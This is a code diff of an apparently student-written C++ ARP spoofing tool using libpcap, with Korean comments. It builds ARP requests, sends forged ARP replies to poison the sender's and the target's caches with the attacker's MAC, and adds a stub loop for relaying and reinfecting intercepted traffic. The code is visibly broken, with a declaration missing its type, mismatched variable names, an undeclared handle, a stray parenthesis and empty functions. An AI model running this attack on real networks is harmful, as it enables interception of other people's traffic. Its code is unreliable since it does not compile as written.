@@ -13,14 +13,16 @@ void usage();
 EthArpPacket arprequest(pcap_t* handle, char *dst_mac, char *src_mac, char *src_ip, char *t_mac, char *t_ip);
 void ArpReply(pcap_t* handle, Mac *dst_mac, Mac *src_mac, Ip *src_ip, Mac *t_mac, Ip *t_ip);
 
+void printInfo(EthArpPacket packet);
+
+
 
 int main(int argc, char* argv[]){
 
-    // if ( argc % 2 != 0 ){
-    //     usage();
-    //     return -1;
-    // }
-
+    if ( argc % 2 != 0 ){
+        usage();
+        return -1;
+    }
 
     // ======================== 초기설정 =============================
 
@@ -30,14 +32,12 @@ int main(int argc, char* argv[]){
     char broad_mac[18] = {0,};
     char empty_mac[18] = {0,};
 
-
     strcpy(broad_mac, "ff:ff:ff:ff:ff:ff");
     strcpy(empty_mac, "00:00:00:00:00:00");
 
-     sender_ip[20];
+    sender_ip[20];
     char target_ip[20];
     char attacker_ip[20];
-
 
     char *interface = argv[1];
 
@@ -62,42 +62,21 @@ int main(int argc, char* argv[]){
     strcpy(sender_ip, argv[2]);
     strcpy(target_ip, argv[3]);
 
-<<<<<<< HEAD
     // sender_mac 주소 알아오기 
     EthArpPacket * arppacket = new EthArpPacket;
     arppacket = arprequest(handle, broad_mac,attacker_mac,attacker_ip,empty_mac, target_ip); // target_mac 주소 알아오기 
     retype(arppacket,sender_ip, target_ip, sender_mac, target_mac);
 
+
+    printInfo(arppacket);
+
     // sender 속이기 , target 속이기 
     ArpReply(handle,sender_mac,attacker_mac,target_ip,attacker_mac,sender_ip);// gateway_mac request (attacekr -> gateway)
     ArpReply(handle,target_mac,attacker_mac,sender_ip,attacker_mac,target_ip);// gateway_mac request (attacekr -> gateway)
 
+    // relay 하기 
 
-
-    // sender와 target이 보내는 
-    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,sender_ip, "request");// sender_mac 주소 알아오기 
-    ArpReply(handle, attacker_ip, attacker_mac, sender_mac, sender_ip); 
-
-    // cout << "sender_mac" << endl;
-
-    // ============= ARP 스푸핑 공격 수행하기 ====================== 
-
-    // sender 속이기 
-    ArpReply(handle,sender_mac,attacker_mac,target_ip,attacker_mac,sender_ip);// gateway_mac request (attacekr -> gateway)
-
-    // target 속이기 
-    ArpReply(handle,target_mac,attacker_mac,sender_ip,attacker_mac,target_ip);// gateway_mac request (attacekr -> gateway)
-
-
-
-
-    // reply()
-
-    // relay()
-    // reinfect()
-
-
-
+    ArpRelay();
 
 }
 
@@ -198,3 +177,50 @@ void ArpReply(pcap_t* handle, Mac *dst_mac, Mac *src_mac, Ip *src_ip, Mac *t_mac
     }
 
 )
+
+
+
+// sender와 target 이 보내는 패킷 relay 및 sender 와 target 이 보내는 패킷 재감염 
+void ArpRelay(){
+    EthArpPacket* relay_packet;
+
+
+    struct pcap_pkthdr *header;
+    const u_char* packet;
+
+    while(true){
+        int result = pcap_next_ex(handle, &header, &relayPacket);
+
+        if (result == 1){
+           
+            reply_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(rely_packet));
+        }
+
+
+        // 경우의 수 1 [ 재감염 ]
+            // src_ip 가 victim_ip 일 경우 sender에게 다시 보냄 
+            // src_ip가 target_ip 일 경우 target에게 다시 보냄 
+
+        // 경우의 수 2 
+            // src_map = sender_mac , d_mac == my_mac 
+            // relay 로 패킷 전달 
+            
+
+        // 경우의 수 3 
+
+        
+
+
+
+
+
+    }
+
+}
+
+void printInfo(EthArpPacket packet){
+
+
+    
+
+}
